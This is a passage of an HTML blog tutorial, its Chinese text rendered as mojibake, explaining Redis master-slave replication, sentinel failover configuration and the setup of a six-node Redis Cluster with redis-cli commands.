alt="ä»èŠ‚ç‚¹"></p><p>ä¸»èŠ‚ç‚¹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E4%B8%BB%E8%8A%82%E7%82%B9.124i7i3mtvg0.jpg" alt="ä¸»èŠ‚ç‚¹"></p></li><li><p>ä¸»ä»å…³ç³»å®ç°åï¼ŒéªŒè¯æ˜¯å¦å®ç°æ•°æ®å¤åˆ¶</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6.3458jbrjayg0.jpg" alt="æ•°æ®å¤åˆ¶"></p></li></ol><h2 id="ä¸»ä»å¤åˆ¶åŸç†">ä¸»ä»å¤åˆ¶åŸç†</h2><p>åœ¨Redis2.8ä¹‹å‰åŒæ­¥æ–¹å¼éƒ½ä»¥<code>å…¨é‡æ–¹å¼</code>åŒæ­¥ï¼Œä½†ä¹‹åä¸ºäº†æé«˜æ•ˆç‡ï¼Œæ•°æ®å¤åˆ¶æ–¹å¼åˆ†ä¸ºä¸¤ç§ï¼š<code>å…¨é‡å¤åˆ¶</code>å’Œ<code>éƒ¨åˆ†å¤åˆ¶</code>ã€‚</p><ul><li>å…¨é‡å¤åˆ¶ï¼šå°†ä¸»æœåŠ¡å™¨ä¸­çš„æ•°æ®ï¼Œå…¨éƒ¨åŒæ­¥åˆ°ä»æœåŠ¡å™¨ä¸­ï¼Œä¸€èˆ¬æ˜¯åœ¨ä»æœåŠ¡å™¨å¯åŠ¨åˆå§‹åŒ–æ•°æ®çš„æ—¶å€™è¿›è¡Œå…¨é‡åŒæ­¥</li><li>éƒ¨åˆ†å¤åˆ¶ï¼šå°†æœªåŒæ­¥çš„å¢é‡æ•°æ®ï¼ŒåŒæ­¥åˆ°ä»æœåŠ¡å™¨ï¼Œæ— éœ€å†å…¨éƒ¨å¤åˆ¶ä¸€éï¼Œä¸€èˆ¬ç”¨äºå› ç½‘ç»œä¸­æ–­ç­‰æ— æ³•åŒæ­¥æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå¾…æ¢å¤æ­£å¸¸ä¹‹åï¼Œå°†ä¸­æ–­æœŸé—´çš„æ•°æ®è¿›è¡Œéƒ¨åˆ†åŒæ­¥</li></ul><h3 id="å…¨é‡å¤åˆ¶å›¾è§£">å…¨é‡å¤åˆ¶å›¾è§£</h3><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/å…¨é‡å¤åˆ¶.40tonu0t4to0.png" alt="å…¨é‡å¤åˆ¶" style="zoom: 50%;" /><p>è§£é‡Šè¯´æ˜ï¼š</p><p>1ã€ä»èŠ‚ç‚¹æ–­å¼€è¿æ¥åï¼Œå‘é€åŒæ­¥è¯·æ±‚<code>psync</code>å°è¯•å»ºç«‹è¿æ¥</p><p>2ã€ä¸»èŠ‚ç‚¹å‘ä»èŠ‚ç‚¹å‘é€ä¿¡æ¯ï¼Œè·å–<code>runid</code>å’Œ<code>offset</code></p><p>3ã€ä¸»èŠ‚ç‚¹forkå­è¿›ç¨‹å°†å…¨éƒ¨æ•°æ®ç”Ÿæˆ<code>RDBæ–‡ä»¶</code></p><p>4ã€ä¸»èŠ‚ç‚¹æœŸé—´æ¥æ”¶åˆ°çš„<code>write</code>å‘½ä»¤å­˜å…¥åˆ°å¤åˆ¶ç¼“å†²åŒº</p><p>5ã€å½“ä¸»èŠ‚ç‚¹<code>RDBæ–‡ä»¶</code>å®Œæˆåå‘é€ç»™ä»èŠ‚ç‚¹</p><p>6ã€ä»èŠ‚ç‚¹æ¥å—<code>RDBæ–‡ä»¶</code>åï¼Œæ¸…ç©ºæ—§æ•°æ®ï¼ŒåŠ è½½RDBæ•°æ®åˆ°å†…å­˜ä¸­ï¼ˆå³ç›´æ¥å°†å…¶ä½œä¸ºæ•°æ®æ–‡ä»¶ï¼‰</p><p>7ã€ä¸»èŠ‚ç‚¹å‘é€ç¼“å†²åŒºå†…çš„æ•°æ®åˆ°ä»èŠ‚ç‚¹</p><p>8ã€ä»èŠ‚ç‚¹æ¥å—å¤åˆ¶ç¼“å†²åŒºå‘½ä»¤å¹¶æ‰§è¡Œï¼Œæœ€ååŒæ­¥åˆ°æœ€æ–°æ•°æ®ä¸­</p><h3 id="éƒ¨åˆ†å¤åˆ¶å›¾è§£">éƒ¨åˆ†å¤åˆ¶å›¾è§£</h3><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/éƒ¨åˆ†å¤åˆ¶.6cn0kqkut9o0.png" alt="éƒ¨åˆ†å¤åˆ¶" style="zoom:50%;" /><p>è§£é‡Šè¯´æ˜ï¼š</p><p>1ã€å½“ä¸»ä»æœåŠ¡å™¨ä¹‹é—´ç”±äºç½‘ç»œä¸­æ–­åï¼Œä»èŠ‚ç‚¹ä¼šå°è¯•è¿æ¥ä¸»èŠ‚ç‚¹</p><p>2ã€é‡è¿æœŸé—´ä¸»èŠ‚ç‚¹æ¥æ”¶åˆ°çš„<code>write</code>å‘½ä»¤ä¼šå­˜å…¥åˆ°å¤åˆ¶ç¼“å†²åŒº</p><p>3ã€å½“ç½‘ç»œæ¢å¤åï¼Œä»èŠ‚ç‚¹æˆåŠŸè¿æ¥ä¸»èŠ‚ç‚¹ï¼Œç”±äºä¹‹å‰ä»èŠ‚ç‚¹ä¿å­˜äº†ä¸»èŠ‚ç‚¹çš„<code>runid</code> å’Œ<code>offset</code>ï¼Œæ‰€ä»¥åªéœ€è¦å‘é€å‘½ä»¤ <code>psync &#123;runid&#125; &#123;offset&#125;</code>å³å¯</p><p>4ã€ä¸»èŠ‚ç‚¹æ¥æ”¶åˆ°ä»èŠ‚ç‚¹çš„è¯·æ±‚ï¼Œä¼šå…ˆéªŒè¯è¯·æ±‚çš„<code>runid</code>æ˜¯å¦å’Œè‡ªèº«çš„çš„ <code>runid</code>åŒ¹é…ï¼Œä¸åŒ¹é…åˆ™è¿›è¡Œ<code>å…¨é‡å¤åˆ¶</code>ï¼Œå…¶åæŸ¥çœ‹è¯·æ±‚çš„<code>offset</code>åœ¨è‡ªèº«å¤åˆ¶ç¼“å†²åŒºæŸ¥æ‰¾ï¼Œå¦‚æœåç§»é‡ä¹‹åçš„æ•°æ®å­˜åœ¨ç¼“å†²åŒºä¸­ï¼Œåˆ™å¯¹ä»èŠ‚ç‚¹å‘é€<code> +CONTINUE</code> å“åº”ï¼Œè¡¨ç¤ºå¯ä»¥è¿›è¡Œéƒ¨åˆ†å¤åˆ¶ã€‚</p><p>5ã€å½“ä»èŠ‚ç‚¹ä¼ é€’è¿‡æ¥çš„runidå’ŒoffsetéªŒè¯é€šè¿‡æ—¶ï¼Œåˆ™è¿›è¡Œéƒ¨åˆ†å¤åˆ¶ï¼Œå¹¶è®°å½•æ–°çš„<code>offset</code></p><div class="note info flat"><p>PSï¼šå½“ä¸»æœºå®•æœºæ—¶ï¼Œä¸»ä»å…³ç³»ä»å­˜åœ¨ï¼Œå„ä»æœºä¸­çš„ä¸»æœºä¿¡æ¯ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä¸»æœºé‡å¯åï¼Œå…¶ä»æœºä¿¡æ¯ä¸å®•æœºå‰çš„ä¸€è‡´</p></div><h2 id="æ¨¡å¼">æ¨¡å¼</h2><h3 id="ä¸€ã€è–ªç«ç›¸ä¼ "><strong>ä¸€ã€è–ªç«ç›¸ä¼ </strong></h3><p>æœ‰ä¸‰ä¸ªèŠ‚ç‚¹ABCï¼ŒAä¸ºä¸»æœºï¼ŒBä¸ºAçš„ä»æœºï¼ŒCä¸ºBçš„ä»æœºã€‚</p><ol><li>ä¸»æœºAæ— æ³•å¯¹Cè¿›è¡Œä¸»ä»å¤åˆ¶</li><li>å½“ä¸»æœºAå­˜æ´»æ—¶ï¼ŒBã€Céƒ½ä¸å¯å†™æ•°æ®ï¼Œåªèƒ½è¯»æ•°æ®</li><li>ä¸»æœºAå®•æœºåï¼ŒBã€Cä»ä¸å¯å†™æ•°æ®ï¼Œç›´åˆ°Bä½¿ç”¨<code>slaveof no one</code>å‘½ä»¤åï¼Œå³ä¸‹é¢æ‰€è®²çš„<code>åå®¢ä¸ºä¸»</code>æ¨¡å¼ï¼ŒBå¯ä»¥å†™æ•°æ®ï¼ŒCå¯ä»¥è¯»å–Bå†™çš„æ•°æ®</li></ol><p><strong>å®˜æ–¹æ¦‚è¿°</strong>ï¼šä¸Šä¸€ä¸ª<code>slave</code>ï¼ˆä»æœºï¼‰å¯ä»¥æ˜¯ä¸‹ä¸€ä¸ª<code>slave</code>ï¼ˆä»æœºï¼‰çš„<code>master</code>ï¼ˆä¸»æœºï¼‰ï¼Œ<code>slave</code>åŒæ ·å¯ä»¥æ¥æ”¶å…¶ä»–slavesçš„è¿æ¥å’ŒåŒæ­¥è¯·æ±‚ï¼Œé‚£ä¹ˆè¯¥<code>slave</code>ä½œä¸ºäº†é“¾æ¡ä¸­ä¸‹ä¸€ä¸ªçš„<code>master</code>ï¼Œå¯ä»¥æœ‰æ•ˆå‡è½»<code>master</code>çš„å†™å‹åŠ›ã€‚</p><p><strong>é£é™©</strong>ï¼šä¸€æ—¦æŸä¸ªä»æœºå®•æœºï¼Œåé¢çš„ä»æœºéƒ½æ— æ³•å¤‡ä»½ã€‚</p><p><strong>ä¸­é€”å˜æ›´è½¬å‘</strong>ï¼šä¼šæ¸…é™¤ä¹‹å‰çš„æ•°æ®ï¼Œé‡æ–°å»ºç«‹æ‹·è´æœ€æ–°çš„ã€‚</p><h3 id="äºŒã€åå®¢ä¸ºä¸»"><strong>äºŒã€åå®¢ä¸ºä¸»</strong></h3><p>å½“ä¸€ä¸ª<code>master</code>å®•æœºåï¼Œåé¢çš„<code>slave</code>é€šè¿‡å‘½ä»¤å¯ä»¥ç«‹åˆ»å‡ä¸º<code>master</code>ï¼Œå…¶åé¢çš„<code>slave</code>ä¸ç”¨åšä»»ä½•ä¿®æ”¹ï¼Œä½†ä¸ç”¨ä¿®æ”¹çš„å‰æåœ¨äº<code>ä»æœº</code>å®ç°äº†è–ªç«ç›¸ä¼ æ¨¡å¼ï¼Œå¦åˆ™ä»éœ€è¿›è¡Œä¸»ä»å…³ç³»ç¡®è®¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof no one# å°†ä»æœºå˜ä¸ºä¸»æœº</span><br></pre></td></tr></table></figure><p>å½“å®•æœºåçš„<code>master</code>é‡å¯åï¼Œæ­¤æ—¶å·²æ— ä»»ä½•ä¸»ä»å…³ç³»ï¼Œæ— ä»»ä½•å¤åˆ¶å…³ç³»ã€‚</p><h3 id="ä¸‰ã€å“¨å…µæ¨¡å¼"><strong>ä¸‰ã€å“¨å…µæ¨¡å¼</strong></h3><p>å“¨å…µæ¨¡å¼ï¼Œä¿—ç§°<font color="red">åå®¢ä¸ºä¸»çš„è‡ªåŠ¨ç‰ˆ</font>ï¼Œèƒ½å¤Ÿåå°ç›‘æ§ä¸»æœºæ˜¯å¦æ•…éšœï¼Œè‹¥æ•…éšœäº†åˆ™æ ¹æ®<code>æŠ•ç¥¨æ•°</code>è‡ªåŠ¨<code>å°†ä»åº“è½¬æ¢ä¸ºä¸»åº“</code>ï¼Œä¿è¯äº†ç³»ç»Ÿçš„å¯ç”¨æ€§ã€‚</p><h4 id="ä½œç”¨">ä½œç”¨</h4><ul><li>ç›‘æ§ï¼ˆMonitoringï¼‰ï¼šå“¨å…µä¼šä¸æ–­åœ°æ£€æŸ¥ä¸»èŠ‚ç‚¹å’Œä»èŠ‚ç‚¹æ˜¯å¦è¿è¡Œæ­£å¸¸</li><li>è‡ªåŠ¨æ•…éšœè½¬ç§»ï¼ˆAutomatic falioverï¼‰ï¼šå½“ä¸»èŠ‚ç‚¹ä¸èƒ½æ­£å¸¸å·¥ä½œæ—¶ï¼Œå“¨å…µä¼šå¼€å§‹è‡ªåŠ¨æ•…éšœè½¬ç§»æ“ä½œï¼Œå®ƒä¼šå°†å¤±æ•ˆä¸»èŠ‚ç‚¹çš„å…¶ä¸­ä¸€ä¸ªä»èŠ‚ç‚¹å‡çº§ä¸ºæ–°çš„ä¸»èŠ‚ç‚¹ï¼Œå¹¶è®©å…¶ä»–ä»èŠ‚ç‚¹æ”¹ä¸ºå¤åˆ¶æ–°çš„ä¸»èŠ‚ç‚¹</li><li>é…ç½®æä¾›è€…ï¼ˆConfiguration providerï¼‰ï¼šå®¢æˆ·ç«¯åœ¨åˆå§‹åŒ–æ—¶ï¼Œé€šè¿‡è¿æ¥å“¨å…µæ¥è·å¾—å½“å‰RedisæœåŠ¡çš„ä¸»èŠ‚ç‚¹åœ°å€</li><li>é€šçŸ¥ï¼ˆNotificationï¼‰ï¼šå“¨å…µå¯ä»¥å°†æ•…éšœè½¬ç§»çš„ç»“æœå‘é€ç»™å®¢æˆ·ç«¯</li></ul><h4 id="æ­¥éª¤">æ­¥éª¤</h4><ol><li><p>è°ƒæ•´ä¸º<code>ä¸€ä¸»äºŒä»†æ¨¡å¼</code>ï¼Œ<code>6379</code>å¸¦ç€<code>6380</code>ã€<code>6381</code></p></li><li><p>åœ¨è‡ªå®šä¹‰çš„<code>/myredis</code>ç›®å½•ä¸‹æ–°å»º<code>sentinel.conf</code>ï¼Œåˆ‡è®°æ–‡ä»¶åä¸èƒ½æœ‰é”™</p></li><li><p>é…ç½®å“¨å…µ</p><p>åœ¨<code>sentinel.conf</code>æ–‡ä»¶ä¸­å¡«å…¥é…ç½®ä¿¡æ¯ï¼Œä¿å­˜é€€å‡º</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sentinel monitor mymaster <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">6379</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æ³¨ï¼š<code>mymaster</code>ä¸ºç›‘æ§å¯¹è±¡èµ·çš„æœåŠ¡å™¨åç§°ï¼ˆå³å“¨å…µåç§°ï¼‰ï¼Œ<code>1</code>ä¸ºè‡³å°‘æœ‰å¤šå°‘ä¸ªå“¨å…µåŒæ„è¿ç§»çš„æ•°é‡</p></li><li><p>å¯åŠ¨å“¨å…µ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-sentinel /myredis/sentinel.conf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%93%A8%E5%85%B5%E5%90%AF%E5%8A%A8.6svp11zonng0.jpg" alt="å¯åŠ¨å“¨å…µ"></p></li><li><p>å½“ä¸»èŠ‚ç‚¹6379å®•æœºåï¼Œç­‰å¾…30ç§’ï¼Œå“¨å…µè¿›è¡ŒæŠ•ç¥¨æ¨é€‰æ–°ä¸»èŠ‚ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%93%A8%E5%85%B5%E7%A5%A8%E9%80%89.5xpehoup20s0.jpg" alt="å“¨å…µç¥¨é€‰"></p></li><li><p>å½“ä¸»èŠ‚ç‚¹6379é‡æ–°è¿æ¥åï¼Œå“¨å…µæœåŠ¡ç«¯å“åº”ä¸¤å¥</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%8E%9F%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF.18mr2583aghs.jpg" alt="åŸä¸»æœºä¸Šçº¿"></p><p>ç¬¬ä¸€å¥æ˜¯ï¼šå»é™¤6379çš„ä¸‹çº¿å¤„ç†</p><p>ç¬¬äºŒå¥æ˜¯ï¼šé‡è¿6379åˆ°æ–°çš„ä¸»èŠ‚ç‚¹ä¸Šï¼Œæ­¤æ—¶6379ä¸ºæ–°ä¸»èŠ‚ç‚¹çš„ä»èŠ‚ç‚¹</p></li><li><p>æ£€éªŒä¸»ä»å¤åˆ¶æ˜¯å¦æ­£å¸¸å·¥ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%A3%80%E9%AA%8C%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6.62himtzsuys0.jpg" alt="æ£€éªŒä¸»ä»å¤åˆ¶"></p><p>ä¸Šå›¾æ‰€è§ï¼Œä¸»ä»å¤åˆ¶æ­£å¸¸è¿è¡Œï¼Œè‡³æ­¤ï¼Œå“¨å…µæ¨¡å¼çš„é…ç½®å®Œæˆ</p></li></ol><h4 id="ä¼˜ç¼ºç‚¹">ä¼˜ç¼ºç‚¹</h4><p>ä¼˜ç‚¹ï¼š<code>é«˜å¯ç”¨</code>ï¼Œ<code>è¯»å†™åˆ†ç¦»</code>ï¼Œå“¨å…µæ¨¡å¼æ˜¯åŸºäºä¸»ä»æ¨¡å¼çš„ï¼Œä¸»ä»æ¨¡å¼çš„ä¼˜ç‚¹ï¼Œå“¨å…µæ¨¡å¼éƒ½å…·å¤‡ï¼Œä¸»ä»å¯ä»¥è‡ªåŠ¨åˆ‡æ¢ï¼Œç³»ç»Ÿæ›´å¥å£®ï¼Œå¯ç”¨æ€§æ›´é«˜ã€‚</p><p>ç¼ºç‚¹ï¼šRedisæ¯”è¾ƒéš¾æ”¯æŒåœ¨çº¿æ‰©å®¹ï¼Œåœ¨é›†ç¾¤å®¹é‡è¾¾åˆ°ä¸Šçº¿æ—¶åœ¨çº¿æ‰©å®¹ä¼šå˜å¾—éå¸¸å¤æ‚ã€‚</p><h1>Redisé›†ç¾¤</h1><h2 id="æ¦‚è¿°-2">æ¦‚è¿°</h2><p>æ‰€è°“çš„é›†ç¾¤ï¼Œå°±æ˜¯é€šè¿‡æ·»åŠ æœåŠ¡å™¨çš„æ•°é‡ï¼Œæä¾›ç›¸åŒçš„æœåŠ¡ï¼Œä»è€Œè®©æœåŠ¡å™¨è¾¾åˆ°ä¸€ä¸ªç¨³å®šã€é«˜æ•ˆçš„çŠ¶æ€ï¼Œé›†ç¾¤ä¸»è¦è§£å†³<code>å®¹é‡ä¸å¤Ÿ</code>å’Œ<code>å¹¶å‘å†™æ“ä½œå‹åŠ›</code>ç­‰é—®é¢˜ã€‚</p><p>Redis3.0ç‰ˆæœ¬ä¹‹å‰åªæ”¯æŒå•ä¾‹ï¼ˆä»£ç†ä¸»æœºï¼‰ï¼Œåœ¨3.0ç‰ˆæœ¬å³ä»¥åçš„ç‰ˆæœ¬æ‰æ”¯æŒé›†ç¾¤ï¼Œé‡‡ç”¨<code>æ— ä¸­å¿ƒåŒ–é›†ç¾¤</code>é…ç½®ã€‚</p><p>Redisé›†ç¾¤ï¼Œæ˜¯åŸºäºRedisä¸»ä»å¤åˆ¶å®ç°çš„ï¼ŒåŒæ—¶ä¹Ÿå­˜åœ¨ä¸‰ç§æ¨¡å¼ï¼š<code>ä¸»ä»æ¨¡å¼</code>ã€<code>å“¨å…µæ¨¡å¼</code>å’Œ<code>Clusteré›†ç¾¤æ¨¡å¼</code>ã€‚</p><p>ç”±äºå‰ä¸¤ç§æ¨¡å¼åœ¨å‰é¢<code>ä¸»ä»å¤åˆ¶</code>ç¯èŠ‚ä¸­æœ‰è®²è§£ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œé‡ç‚¹å…³æ³¨<code>Clusteræ¨¡å¼</code>ã€‚</p><h2 id="Clusteré›†ç¾¤æ¨¡å¼">Clusteré›†ç¾¤æ¨¡å¼</h2><ul><li>ä¹‹å‰çš„<code>å“¨å…µæ¨¡å¼</code>åŸºæœ¬å·²ç»å¯ä»¥å®ç°é«˜å¯ç”¨ã€è¯»å†™åˆ†ç¦»ï¼Œä½†æ˜¯åœ¨è¿™ç§æ¨¡å¼æ¯å°redisæœåŠ¡å™¨éƒ½å­˜å‚¨ç›¸åŒçš„æ•°æ®ï¼Œå¾ˆ<code>æµªè´¹å†…å­˜èµ„æº</code>ï¼Œæ‰€ä»¥åœ¨Redis3.0ä¸ŠåŠ å…¥äº†<code>Clusteré›†ç¾¤æ¨¡å¼</code>ï¼Œå®ç°äº†Redisçš„<code>åˆ†å¸ƒå¼å­˜å‚¨</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯å°RedisèŠ‚ç‚¹å­˜å‚¨ç€ä¸åŒçš„å†…å®¹</li><li>æ ¹æ®å®˜æ–¹æ¨èï¼Œé›†ç¾¤éƒ¨ç½²è‡³å°‘è¦<code>3å°ä»¥ä¸Š</code>çš„masterèŠ‚ç‚¹ï¼Œæœ€å¥½ä½¿ç”¨<code>3ä¸»3ä»</code>å…­ä¸ªèŠ‚ç‚¹çš„æ¨¡å¼</li><li>Clusteré›†ç¾¤ç”±å¤šä¸ªredisæœåŠ¡å™¨ç»„æˆçš„<code>åˆ†å¸ƒå¼ç½‘ç»œæœåŠ¡é›†ç¾¤</code>ï¼Œé›†ç¾¤ä¹‹ä¸­æœ‰å¤šä¸ªmasterä¸»èŠ‚ç‚¹ï¼Œæ¯ä¸€ä¸ªä¸»èŠ‚ç‚¹éƒ½å¯è¯»å¯å†™ï¼ŒèŠ‚ç‚¹ä¹‹é—´ä¼šç›¸äº’é€šä¿¡ï¼Œä¸¤ä¸¤ç›¸è¿ï¼Œredisé›†ç¾¤æ— ä¸­å¿ƒèŠ‚ç‚¹</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%97%A0%E4%B8%AD%E5%BF%83%E5%8C%96%E9%9B%86%E7%BE%A4.2s6cwtc8k6g0.png" alt="æ— ä¸­å¿ƒåŒ–é›†ç¾¤"></p><ul><li>åœ¨<code>redis-Clusteré›†ç¾¤</code>ä¸­ï¼Œå¯ä»¥ç»™æ¯ä¸ªä¸»èŠ‚ç‚¹æ·»åŠ ä»èŠ‚ç‚¹ï¼Œä¸»èŠ‚ç‚¹å’Œä»èŠ‚ç‚¹ç›´æ¥éµå¾ªä¸»ä»æ¨¡å‹çš„ç‰¹æ€§ï¼Œå½“ç”¨æˆ·éœ€è¦å¤„ç†æ›´å¤šè¯»è¯·æ±‚çš„æ—¶å€™ï¼Œæ·»åŠ ä»èŠ‚ç‚¹å¯ä»¥æ‰©å±•ç³»ç»Ÿçš„è¯»æ€§èƒ½</li><li><code>redis-cluster</code>çš„<code>æ•…éšœè½¬ç§»</code>ï¼šredisé›†ç¾¤çš„ä¸»æœºèŠ‚ç‚¹å†…ç½®äº†ç±»ä¼¼redis sentinelçš„<code>èŠ‚ç‚¹æ•…éšœæ£€æµ‹</code>å’Œ<code>è‡ªåŠ¨æ•…éšœè½¬ç§»</code>åŠŸèƒ½ï¼Œå½“é›†ç¾¤ä¸­çš„æŸä¸ªä¸»èŠ‚ç‚¹ä¸‹çº¿æ—¶ï¼Œé›†ç¾¤ä¸­çš„å…¶ä»–åœ¨çº¿ä¸»èŠ‚ç‚¹ä¼šæ³¨æ„åˆ°è¿™ä¸€ç‚¹ï¼Œå¹¶ä¸”å¯¹å·²ç»ä¸‹çº¿çš„ä¸»èŠ‚ç‚¹è¿›è¡Œæ•…éšœè½¬ç§»</li><li>é›†ç¾¤è¿›è¡Œæ•…éšœè½¬ç§»çš„æ–¹æ³•å’Œ<code>redis sentinel</code>è¿›è¡Œæ•…éšœè½¬ç§»çš„æ–¹æ³•åŸºæœ¬ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯ï¼Œåœ¨é›†ç¾¤é‡Œé¢ï¼Œæ•…éšœè½¬ç§»æ˜¯ç”±é›†ç¾¤ä¸­å…¶ä»–åœ¨çº¿çš„ä¸»èŠ‚ç‚¹è´Ÿè´£è¿›è¡Œçš„ï¼Œæ‰€ä»¥é›†ç¾¤ä¸å¿…å¦å¤–ä½¿ç”¨<code>redis sentinel</code></li></ul><h3 id="æ­¥éª¤-2">æ­¥éª¤</h3><ol><li><p>åˆ é™¤æŒä¹…åŒ–æ•°æ®ï¼ˆrdb/aofæ–‡ä»¶ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /myredis# è¿›å…¥è‡ªå®šä¹‰ç›®å½•</span><br><span class="line">rm -rf rdb*# åˆ é™¤rdbæ–‡ä»¶ï¼Œå¦‚è‹¥æœ‰aofæ–‡ä»¶ï¼Œä¹Ÿä¸€å¹¶åˆ é™¤</span><br></pre></td></tr></table></figure></li><li><p>å®ä¾‹å‡†å¤‡</p><p>Masterç«¯å£ï¼š6379ã€6380ã€6381</p><p>Slaveç«¯å£ï¼š6389ã€6390ã€6391</p><div class="note warning flat"><p>åˆ†é…åŸåˆ™å°½é‡ä¿è¯æ¯ä¸ªä¸»æ•°æ®åº“è¿è¡Œåœ¨ä¸åŒçš„IPåœ°å€ï¼Œæ¯ä¸ªä»åº“å’Œä¸»åº“ä¸åœ¨ä¸€ä¸ªIPåœ°å€ä¸Šã€‚</p></div><p>é…ç½®æ–‡ä»¶<code>redis6379.conf</code></p><p>åˆ é™¤ä¹‹å‰çš„å“¨å…µæ•°æ®ï¼Œæ·»åŠ ä¸‹é¢çš„é›†ç¾¤é…ç½®ï¼Œä¿å­˜é€€å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cluster-enabled yes# æ‰“å¼€é›†ç¾¤æ¨¡å¼</span><br><span class="line">cluster-config-file nodes-6379.conf# è®¾å®šèŠ‚ç‚¹é…ç½®æ–‡ä»¶</span><br><span class="line">cluster-node-timeout 15000# é›†ç¾¤èŠ‚ç‚¹çš„è¶…æ—¶æ—¶é™é»˜è®¤å€¼</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE%E5%88%A0%E9%99%A4.aamudg5l9f4.jpg" alt="é›†ç¾¤é…ç½®åˆ é™¤"></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE%E6%B7%BB%E5%8A%A0.4c4xk3rl6qi0.jpg" alt="é›†ç¾¤é…ç½®æ·»åŠ "></p><p>åˆ é™¤åŸæ¥çš„<code>redis6380.conf</code>å’Œ<code>redis6381.conf</code>æ–‡ä»¶ï¼Œå¦å¤–<code>æ‹·è´5ä»½</code>ä¿®æ”¹çš„<code>redis6379.conf</code>ä¸ºå¯¹åº”ç«¯å£å·æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%8B%B7%E8%B4%9D%E6%96%87%E4%BB%B6.185f6wfoq2yo.jpg" alt="æ‹·è´æ–‡ä»¶"></p><p>è¿›å…¥vimç¼–è¾‘å™¨ï¼Œåœ¨å‘½ä»¤æ¨¡å¼ä¸‹ä½¿ç”¨<code>:%s/6379/æ›¿æ¢åç«¯å£</code>å¿«é€Ÿä¿®æ”¹5ä»½æ‹·è´åçš„é…ç½®æ–‡ä»¶ä¿¡æ¯</p></li><li><p>å¯åŠ¨6ä¸ªredisæœåŠ¡</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1.22uohujnmgcg.jpg" alt="å¯åŠ¨æœåŠ¡"></p></li><li><p>ç»„åˆé›†ç¾¤</p><p>ç»„åˆä¹‹å‰ï¼Œç¡®ä¿æ‰€æœ‰redisæœåŠ¡å¯åŠ¨åï¼Œ<code>nodes-ç«¯å£å·.conf</code>æ–‡ä»¶éƒ½ç”Ÿæˆæ­£å¸¸</p><p>å¦‚æœä½ æ˜¯redis5.0åŠä¹‹åçš„ï¼Œæ— éœ€å®‰è£…rubyä¾èµ–ï¼Œrediså®‰è£…ç›®å½•é‡Œå†…ç½®äº†é›†ç¾¤å‘½ä»¤è¡Œå·¥å…·redis-trib ï¼Œå®ƒæ˜¯ä¸€ä¸ª Ruby ç¨‹åºï¼Œ è¿™ä¸ªç¨‹åºé€šè¿‡å‘å®ä¾‹å‘é€ç‰¹æ®Šå‘½ä»¤æ¥å®Œæˆåˆ›å»ºæ–°é›†ç¾¤ï¼Œ æ£€æŸ¥ç¾¤ï¼Œ æˆ–è€…å¯¹é›†ç¾¤è¿›è¡Œé‡æ–°åˆ†ç‰‡å·¥ä½œã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli --cluster create 192.168.30.0:6379 192.168.30.0:6380 192.168.30.0:6381 192.168.30.0:6389 192.168.30.0:6390 192.168.30.0:6391 --cluster-replicas 1# ç»„åˆå‘½ä»¤</span><br></pre></td></tr></table></figure> <div class="note info no-icon flat"><p>psï¼š<code>--cluster-replicas 1</code> è¿™ä¸ªæŒ‡çš„æ˜¯ä»æœºçš„æ•°é‡ï¼Œè¡¨ç¤ºæˆ‘ä»¬å¸Œæœ›ä¸ºé›†ç¾¤ä¸­çš„æ¯ä¸ªä¸»èŠ‚ç‚¹åˆ›å»ºä¸€ä¸ªä»èŠ‚ç‚¹ã€‚å¦å¤–ï¼Œä¸»ä»æ˜¯éšæœºç»‘å®šçš„ï¼Œåˆ›å»ºå®Œæˆåå¯ä»¥åœ¨masterèŠ‚ç‚¹ä¸­çœ‹åˆ°æ‰€æœ‰èŠ‚ç‚¹çŠ¶æ€ï¼ˆnetstat -natp | grep 6379ï¼‰</p></div><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E7%BB%84%E5%90%88%E9%9B%86%E7%BE%A4.5p63gwu2zhk0.jpg" 